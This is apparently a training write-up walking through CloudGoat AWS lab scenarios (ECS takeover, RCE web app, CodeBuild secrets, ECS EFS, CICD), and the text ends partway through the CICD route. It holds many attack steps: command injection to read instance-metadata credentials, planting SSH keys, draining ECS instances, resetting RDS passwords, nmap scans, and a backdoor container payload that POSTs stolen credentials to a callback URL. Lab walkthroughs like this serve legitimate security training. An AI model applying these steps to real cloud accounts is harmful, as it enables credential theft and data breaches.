**Note:** Task is scheduled as a **replica**, ecs will attempt to **rechedule** it on an available ecs instance if it's current host instance goes down for some reason. 

* Leak the AWS metadata of the **host** machine using the following credentials.

```bash
; curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

<p align="center">
  <img src="/images/cloud/curl_aws.png">
</p>

* Configure the newly AWS profile using the generated AWS Credentials.

```bash
aws configure --profile host
```

<p align="center">
  <img src="/images/cloud/aws_host_ecstakeover.png">
</p>

* Manually add the SessionToken.

```bash
vi .aws/credentials
```

<p align="center">
  <img src="/images/cloud/host_session_token.png">
</p>

* We can deliberately take that instance down using the _credentials_ we got from the host earlier, forcing it to be rescheduled onto an instance that we have more control over.

```bash
aws --profile <host_credentials> ecs update-container-instances-state --cluster <your_cluster_name> --container-instances <target_container_instance> --status DRAINING
```

<p align="center">
  <img src="/images/cloud/draining.png">
</p>

* Wait for **"Vault"** container to be rescheduled, this can be checked by running docker via command injection.

```bash
; docker ps | grep vault
```

<p align="center">
  <img src="/images/cloud/vault_id.png">
</p>

* Using the command injection on the website get the _flag_ from the **"vault"** container.

```bash
; docker exec <vault container id> ls
```

<p align="center">
  <img src="/images/cloud/docker_exec.png">
</p>

```bash
; docker exec <vault container id> cat FLAG.TXT
```

<p align="center">
  <img src="/images/cloud/aws_ecstakeover_flag.png">
</p>

**Scenario:** RCE Web Application

**Command:** `./cloudgoat.py create rce_web_app`

**Scenario Resources**

* 1 VPC with:
  * ELB x 1
  * EC2 x 1
  * S3 x 3
  * RDS x 1
* 2 IAM Users

**Scenario Start**

1. IAM User "Lara"
2. IAM User "McDuck"

<p align="center">
  <img src="/images/cloud/start_rce.png">
</p>

**Scenario Goal**

Find a secret stored in the RDS database.

**Summary**

* Starting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.

* Alternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_rce.png">
</p>

**Route Walkthrough - IAM User “Lara”**

* Configure the **AWS Profile** for lara using the following command.

```bash
aws configure --profile lara
```

<p align="center">
  <img src="/images/cloud/aws_cli_lara.png">
</p>

* List the **S3 bucket** using the configured lara user profile.

```bash
aws s3 ls --profile lara
```

<p align="center">
  <img src="/images/cloud/list_ls_lara.png">
</p>

* Access the buckets.

```bash
aws s3 ls <insert s3 bucket name here> --profile <insert profile name here>
```

<p align="center">
  <img src="/images/cloud/log_rce1.png">
</p>

* Copy the bucket to the local machine using the **sync** command as shown below.

```bash
aws s3 sync s3://<bucket-name> . --profile lara
```

<p align="center">
  <img src="/images/cloud/log_download.png">
</p>

* Found a _ELB_ Log file.

<p align="center">
  <img src="/images/cloud/log_file.png">
</p>

* Read the log file by using [elb-log-analyzer](https://github.com/ozantunca/elb-log-analyzer).

```bash
elb-log-analyzer <elb log filename>
```

<p align="center">
  <img src="/images/cloud/elb_log.png">
</p>

* Tried accessing those URL's from log file, but were **not accessible**.

<p align="center">
  <img src="/images/cloud/rce_not_access.png">
</p>

* Enumerate more information about ELB.

```bash
aws elbv2 describe-load-balancers --profile lara
```

<p align="center">
  <img src="/images/cloud/public_dns_rce.png">
</p>

* Append the _.html_ file name, got from the ELB log file with the **Public DNS**.

<p align="center">
  <img src="/images/cloud/webpage_rce.png">
</p>

<p align="center">
  <img src="/images/cloud/webpage_full.png">
</p>

* Find _command injection_ using the following command.

```bash
ls	
```

<p align="center">
  <img src="/images/cloud/rce_ls.png">
</p>

* Create a new set of SSH keys.

```bash
ssh-keygen -t rsa -C "geekfreak" -f "/home/ubuntu/.ssh/id_rsa" -P ""
```

<p align="center">
  <img src="/images/cloud/ssh_keys_rce.png">
</p>

* Read the RSA Key.

```bash
cat /home/ubuntu/.ssh/id_rsa
```

<p align="center">
  <img src="/images/cloud/cat_rsa_key.png">
</p>

* Save the SSH Keys into a file in the local machine.

<p align="center">
  <img src="/images/cloud/cat_geekfreak.png">
</p>

* Change the permission of the key.

```bash
chmod 600 <filename>
```

<p align="center">
  <img src="/images/cloud/chmod_geekfreak.png">
</p>

* Add the new public key to the **authorized_keys** file on the EC2 instance.

```bash
cat /home/ubuntu/.ssh/id_rsa.pub >> /home/ubuntu/.ssh/authorized_keys
```

<p align="center">
  <img src="/images/cloud/mv_keys.png">
</p>

* Get the IP Address of the EC2 Instance.

```bash
curl ifconfig.me
```

<p align="center">
  <img src="/images/cloud/curl_ifconfig.png">
</p>

* SSH into the EC2 Instance using the following command.

```bash
ssh -i ./<filename> ubuntu@ipaddress
```

<p align="center">
  <img src="/images/cloud/ssh_geekfreak.png">
</p>

* Check for user data specified during the creation of the EC2 instance.

```bash
curl http://169.254.169.254/latest/user-data
```

<p align="center">
  <img src="/images/cloud/user_data.png">
</p>

* Using the leaked data, try to access the psql and retrive the data as shown below.

```bash
psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>
select * from sensitive_information;
```

<p align="center">
  <img src="/images/cloud/lara_secret.png">
</p>

**Route Walkthrough - IAM User “McDuck”**

* Configure the **AWS Profile** for mcduck using the following command.

```bash
aws configure --profile mcduck
```

<p align="center">
  <img src="/images/cloud/aws_cli_mcduck.png">
</p>

* List the **S3 bucket** using the configured mcduck user profile.

```bash
aws s3 ls --profile mcduck
```

<p align="center">
  <img src="/images/cloud/list_mcduck.png">
</p>

* Access the buckets.

```bash
aws s3 ls <insert s3 bucket name here> --profile mcduck
```

<p align="center">
  <img src="/images/cloud/key_mcduck.png">
</p>

* Copy the bucket to the local machine using the **sync** command as shown below.

```bash
aws s3 sync s3://<bucket-name> . --profile mcduck
```

<p align="center">
  <img src="/images/cloud/download_mcduck.png">
</p>

* Change the **permission** of the key.

```bash
chmod 700 <filename>
```

<p align="center">
  <img src="/images/cloud/permission_mcduck.png">
</p>

* Enumerate more information about the running EC2 Instances.

```bash
aws ec2 describe-instances --profile mcduck
```

<p align="center">
  <img src="/images/cloud/public_mcduck.png">
</p>

* SSH into the EC2 Instance using the following command.

```bash
ssh -i ./<filename> ubuntu@ipaddress
```

<p align="center">
  <img src="/images/cloud/ssh_mcduck.png">
</p>

* Install AWS CLI.

```bash
sudo apt-get install awscli
```

<p align="center">
  <img src="/images/cloud/install_aws_mcduck.png">
</p>

* List the S3 bucket.

```bash
aws s3 ls
```

<p align="center">
  <img src="/images/cloud/s3_ls.png">
</p>

* Try accessing the **secret** S3 bucket from here.

```bash
aws s3 ls s3://<insert s3 bucket name here>
```

<p align="center">
  <img src="/images/cloud/secret_bucket.png">
</p>

* Copy the bucket to the local machine using the **sync** command as shown below.

```bash
aws s3 sync s3://<bucket-name> .
```

<p align="center">
  <img src="/images/cloud/download_new_bucket.png">
</p>

* Read the _db.txt_ file as shown below.

```bash
cat db.txt
```

<p align="center">
  <img src="/images/cloud/db_file.png">
</p>

* Enumerate RDS Instance Information.

```bash
aws rds describe-db-instances --region us-east-1
```

<p align="center">
  <img src="/images/cloud/rds_info.png">
</p>

* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.

```bash
psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat
\dt
select * from sensitive_information;
```

<p align="center">
  <img src="/images/cloud/secret_mcduck.png">
</p>

**Scenario:** Code Build Secrets

**Command:** `./cloudgoat.py create codebuild_secrets`

**Scenario Resources**

* 1 CodeBuild Project
* 1 Lambda function
* 1 VPC with:
  * RDS x 1
  * EC2 x 1
* 2 IAM Users

**Scenario Start**

IAM User "Solo"

<p align="center">
  <img src="/images/cloud/start_code.png">
</p>

**Scenario Goal**

A pair of secret strings stored in a secure RDS database.

**Summary**

* Starting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.

* Alternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.

**Note:** This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_codebuild.png">
</p>

**Walkthrough - "Calrissian" via RDS Snapshot**

* Configure the AWS Profile for **solo** using the following command.

```bash
aws configure --profile solo
```

<p align="center">
  <img src="/images/cloud/solo_aws_codebuild.png">
</p>

* **List** the code build projects for solo profile.

```bash
aws codebuild list-projects --profile solo
```

<p align="center">
  <img src="/images/cloud/list_codebuild.png">
</p>

* Enumerate more information about the project.	

```bash
aws codebuild batch-get-projects --names <project> --profile solo
```

<p align="center">
  <img src="/images/cloud/calrissian_aws.png">
</p>

**Note:** From the above image it was observed that the project leaked the AWS keys of _calrissian_ user.

* Configure the AWS Profile for **calrissian** using the following command.

```bash
aws configure --profile calrissian
```

<p align="center">
  <img src="/images/cloud/aws_calrissian.png">
</p>

* Look for **RDS** instance.

```bash
aws rds describe-db-instances --profile calrissian
```

<p align="center">
  <img src="/images/cloud/rds_instance_codebuild1.png">
</p>

* Create a **snapshot** of the database.

<p align="center">
  <img src="/images/cloud/rds_creation_instance.png">
</p>

* Identify the **subnet group** of created snapshot.

<p align="center">
  <img src="/images/cloud/subnet_group.png">
</p>

* Enumerate the **security groups**.

```bash
aws ec2 describe-security-groups --profile calrissian
```

<p align="center">
  <img src="/images/cloud/security_group_id.png">
</p>

* Launch the new RDS using the created snapshot.

```bash
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID> --db-snapshot-identifier <scapshotId> --db-subnet-group-name <db subnet group> --publicly-accessible --vpc-security-group-ids <ec2-security group> --profile calrissian
```

<p align="center">
  <img src="/images/cloud/restore_rds_instance.png">
</p>

* Wait for _5 mins_ for the RDS to boot-up and then modify the _master password_.

```bash
aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-password cloudgoat --profile calrissian
```

<p align="center">
  <img src="/images/cloud/modify_instance.png">
</p>

* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.

```bash
psql postgresql://cgadmin:cloudgoat@<rds-instance>:5432/postgres
\l
\c securedb
select * from sensitive_information;
```

<p align="center">
  <img src="/images/cloud/flag_calrissian.png">
</p>

**Walkthrough - Solo via EC2 Metadata service**

* Configure the AWS Profile for **solo** using the following command.

```bash
aws configure --profile solo
```

<p align="center">
  <img src="/images/cloud/solo_aws_codebuild.png">
</p>

* Query the AWS Systems Manager Parameter Store.

```bash
aws ssm describe-parameters --profile solo
```

<p align="center">
  <img src="/images/cloud/ssh_keys_solo.png">
</p>

* Get the details of the **private key**.

```bash
aws ssm get-parameter --name <private key name> --profile solo
```

<p align="center">
  <img src="/images/cloud/private_keys_solo.png">
</p>

* Save the **private keys**.

```bash
echo -e "<private key>" > ec2_ssh_key
```

<p align="center">
  <img src="/images/cloud/save_ssh_keys.png">
</p>

* **Change** the permission of SSH Key.

```bash
chmod 400 ec2_ssh_key
```

<p align="center">
  <img src="/images/cloud/permission_solo_key.png">
</p>

* Get the details of the **public key**.

```bash
aws ssm get-parameter --name <public key name> --profile solo
```

<p align="center">
  <img src="/images/cloud/public_keys_solo.png">
</p>

* Save the **public keys**.

```bash
echo -e "<public key>" > ec2_ssh_key.pub
```

<p align="center">
  <img src="/images/cloud/save_public_key_solo.png">
</p>

* Enumerate more information about the **running** EC2 Instances.

```bash
aws ec2 describe-instances --profile solo
```

<p align="center">
  <img src="/images/cloud/ec2_solo_running.png">
</p>

* **SSH** into the EC2 Instance using the following command.

```bash
ssh -i ec2_ssh_key ubuntu@<instance ip>
```

<p align="center">
  <img src="/images/cloud/ssh_into_solo.png">
</p>

* Query for metadata in the instance.

```bash
curl http://169.254.169.254/latest/user-data
```

<p align="center">
  <img src="/images/cloud/psql_user_data.png">
</p>

* Using **DB name,Username,Password and RDS Instance** try to connect via psql to retrive _sensitive information_.

```bash
psql postgresql://cgadmin:wagrrrrwwgahhhhwwwrrggawwwwwwrr@<rds-instance>:5432/securedb
\d
select * from sensitive_information;
```

<p align="center">
  <img src="/images/cloud/flag_codebuild_solo.png">
</p>

**Scenario:** ECS EFS Attack

**Command:** `./cloudgoat.py create ecs_efs_attack`

**Scenario Resources**

- 1 VPC with:
	- EC2 x 2
	- 1 ECS Cluster
	- 1 ECS Service 
	- 1 EFS

**Scenario Start**

1. SSH access to "Ruse_Box" EC2

<p align="center">
  <img src="/images/cloud/start_efs.png">
</p>

**Scenario Goal**

Mount the "cg-efs-[CG_ID]" efs and obtain the flag.

**Summary**

Starting with accessing the "ruse" EC2 the user leverages the instance profile to backdoor the running ECS container. Using the backdoored container the attacker can retrieve credentials from the container metadata API. These credentials allow the attacker to start a session on any EC2 with the proper tags set. The attacker uses their permissions to change the tags on the Admin EC2 and starts a session. Once in the Admin EC2 the attacker will port scan the subnet for an open EFS to mount. Once mounted the attacker can retrieve the flag from the elastic file system.

**Exploitation Route**

<p align="center">
  <img src="/images/cloud/exploitation_efs.png">
</p>

**Route Walkthrough**

* Connect to the start ec2 "Ruse_Box" using the public IP and SSH key provided.

```bash
ssh -i cloudgoat ubuntu@<IP ADDRESS>
```

<p align="center">
  <img src="/images/cloud/ssh_efs.png">
</p>

* Query for **metadata** in the instance.

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role name>
```

<p align="center">
  <img src="/images/cloud/metadata_efs.png">
</p>

* Configure the AWS Profile for **ruse** using the following command.

```bash
aws configure --profile ruse
```

<p align="center">
  <img src="/images/cloud/aws_profile_ruse.png">
</p>
 
* Manually add the **SessionToken**.

```bash
vi .aws/credentials
```

<p align="center">
  <img src="/images/cloud/session_token_ruse.png">
</p>

* List the **policies**. 

```bash
aws iam list-policies --profile ruse
```

<p align="center">
  <img src="/images/cloud/list_policy_ruse.png">
</p>

* List EC2 instances.

```bash
aws ec2 describe-instances --profile ruse
```

<p align="center">
  <img src="/images/cloud/list_ec2_ruse.png">
</p>

* List all available **ECS clusters**.

```bash
aws ecs list-clusters --profile ruse
```

<p align="center">
  <img src="/images/cloud/list_cluster_ruse.png">
</p>

* List **services** in cluster.

```bash
aws ecs list-services --cluster <CLUSTER ARN> --profile ruse
```

<p align="center">
  <img src="/images/cloud/list_service_ruse.png">
</p>

* Enumerate more information about the cluster and services.

```bash
aws ecs describe-services --cluster <cluster-name> --services <service-name>
```

<p align="center">
  <img src="/images/cloud/describe_service_ruse.png">
</p>

* Download **task definition**.

```bash
aws ecs describe-task-definition --task-definition <TASK_NAME>:<VERSION> --profile ruse > task_def.json
```

<p align="center">
  <img src="/images/cloud/describe_task_definition.png">
</p>

* Download **template** to register a new task.

```bash
aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json
```

<p align="center">
  <img src="/images/cloud/register_task_definition.png">
</p>

* Use **task_def.json** to fill out **task_template.json** with the desired payload.

```bash
/bin/sh -c \"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST -d @data.json {{CALLBACK URL}} \
```
<p align="center">
  <img src="/images/cloud/task_template1.png">
</p>

* **Update** the ECS service.

```bash
aws ecs update-service --service <service_arn> --cluster <cluster_arn> --task-definition <backdoor_task>
```

<p align="center">
  <img src="/images/cloud/update_ecs_efs.png">
</p>

* Wait for the task to run and **POST** the credentials to your listener.

<p align="center">
  <img src="/images/cloud/post_credentials1.png">
</p>

* With the **new creds** add them to "ruse_box"

```bash
aws configure --profile ecs
```

<p align="center">
  <img src="/images/cloud/aws_new_profile_ecs.png">
</p>

* Modify **Admin EC2 tags**.

```bash
aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true
```

<p align="center">
  <img src="/images/cloud/create_tags.png">
</p>

* Start a **session** on Admin EC2.

```bash
aws ssm start-session --target <INSTANCE ID> --profile ecs
```

<p align="center">
  <img src="/images/cloud/ssm_user_login.png">
</p>

* Looking at the EC2 instances we see the Admin EC2 only has a **single port open**, we Nmap scan this port.

```bash
nmap -Pn -p 2049 --open 10.10.10.0/24
```

<p align="center">
  <img src="/images/cloud/ssm_nmap.png">
</p>

* **Mount** discovered EC2.

```bash
cd /mnt
sudo mkdir efs 
sudo mount -t nfs -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport {EFS_IP}:/ efs
```

<p align="center">
  <img src="/images/cloud/mnt_efs.png">
</p>

* Read the **flag.txt** using the following command.

```bash
cat flag.txt
```

<p align="center">
  <img src="/images/cloud/cat_ecs_efs_flag.png">
</p>

**Scenario:** CICD

**Command:** `./cloudgoat.py create cicd`

**Scenario Resources**

* 3 IAM users
* 1 VPC with 1 EC2 instance
* 1 API Gateway
* 1 Lambda function
* 1 ECR image
* 2 CodeBuild project (and an additional out of scope)

**Scenario Start**

You are provided with the access key ID and secret access key of an initial IAM user.

<p align="center">
  <img src="/images/cloud/start_cicd.png">
</p>

**Scenario Story**

FooCorp is a company exposing a public-facing API. Customers of FooCorp submit sensitive data to the API every minute to the following API endpoint:

```
POST {apiUrl}/prod/hello
Host: {apiHost}
Content-Type: text/html
superSecretData=...
```

The API is implemented as a Lambda function, exposed through an API Gateway. 

Because FooCorp implements DevOps, it has a continuous deployment pipeline automatically deploying new versions of their Lambda function from source code to production in under a few minutes.

**Scenario Goal**

Retrieve the sensitive data submitted by customers.

**Note:** That simulated user activity is taking place in the account. This is implemented through a CodeBuild project running every minute and simulating customers requests to the API. This CodeBuild project is out of scope.

**Summary**

  You get access to an initial AWS access key. Escalate your privileges by overwriting the tag of an EC2 instance used for attribute-based access control. Steal the SSH key on the instance, and use it to clone a CodeCommit repository. Go through the commit history, and find a new set of AWS credentials. Use them to backdoor the application and steal the sensitive data.

**Route Walkthrough**

* Configure the AWS Profile for cicd using the following command.

```bash
aws configure --profile cicd
```

<p align="center">
  <img src="/images/cloud/aws_cicd_cli.png">
</p>

* Enumerate information about the running **EC2 Instances**.

```bash
aws ec2 describe-instances --region us-east-1 --profile cicd
```

<p align="center">
  <img src="/images/cloud/instance_id_cicd1.png">
</p>

* Check the running EC2 instances. You notice one is tagged with ```bashEnvironment=dev```, and you therefore can't SSM to it. Instead, overwrite the ```Environment``` tag with the value sandbox, then establish a SSM session to the instance.

```bash
aws ec2 create-tags --resources i-xxxx --tags Key=Environment,Value=sandbox
```

<p align="center">
  <img src="/images/cloud/create_tags.png">
</p>

```bash
aws ssm start-session --target i-xxxx
```
<p align="center">
  <img src="/images/cloud/start_session.png">
</p>

* Under the home directory, find a SSH private key.

```bash
cd
cat .ssh/id_rsa
```

<p align="center">
  <img src="/images/cloud/id_rsa_cicd.png">
</p>

* Copy the SSH key to your local machine ```(~/.ssh/stolen_key)``` and run ```chmod 600 ~/.ssh/stolen_key``` on it.

<p align="center">
  <img src="/images/cloud/stolen_key_cicd.png">
</p>

* Extract the corresponding public key fingerprint to notice it is linked to the ```CodeCommit``` credentials of the IAM user ```cloner```.

```bash
aws iam list-ssh-public-keys --user-name cloner --profile cicd
```

<p align="center">
  <img src="/images/cloud/cloner_username.png">
</p>

```bash
aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id <SSHPublicKeyId found above> --encoding PEM --output text --query 'SSHPublicKey.Fingerprint'
```

<p align="center">
  <img src="/images/cloud/get_ssh_cicd1.png">
</p>

* Find the CodeCommit user ID of cloner using 

```aws iam list-ssh-public-keys --user-name cloner --output text --query 'SSHPublicKeys[0].SSHPublicKeyId'```

<p align="center">
  <img src="/images/cloud/list_ssh_public.png">
</p>
